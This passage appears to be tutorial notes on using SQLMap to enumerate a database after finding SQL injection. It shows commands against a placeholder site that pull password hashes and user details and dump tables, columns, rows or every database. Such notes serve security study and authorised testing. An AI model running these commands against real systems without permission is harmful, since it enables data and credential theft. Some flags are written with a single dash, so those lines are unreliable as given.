## **Database Enumeration**

After detecting SQLi, SQLMap can retrieve basic information such as:

- Database version → `-banner`
- Current user → `-current-user`
- Current database → `-current-db`
- Check DBA privileges → `-is-dba`
- Password hashes → `-passwords`

For retrieving usernames : Inband Query , Blind Query

**Table Enumeration :** After finding the database name (e.g., `testdb`), list all tables:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--tables -D testdb
```

**Dump a Table :** Dump data from the `users` table:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--dump -T users -D testdb
```

**Dump Specific Columns :** Retrieve only selected columns:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--dump -T users -D testdb \
-C name,surname
```

**Dump Specific Rows :** Retrieve only rows 2–3**.**

```bash
sqlmap -u "http://www.example.com/?id=1" \
--dump -T users -D testdb \
--start=2 --stop=3
```

**Conditional Enumeration :** Retrieve rows matching a condition.

```bash
sqlmap -u "http://www.example.com/?id=1" \
--dump -T users -D testdb \
--where="name LIKE 'f%'"
```

**Full Database Enumeration**

- Dump all tables from one database:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--dump -D testdb
```

- Dump all databases:

```bash
sqlmap -u "http://www.example.com/?id=1" \
--dump-all
```

- Skip system databases (recommended):

```bash
sqlmap -u "http://www.example.com/?id=1" \
--dump-all --exclude-sysdbs
```
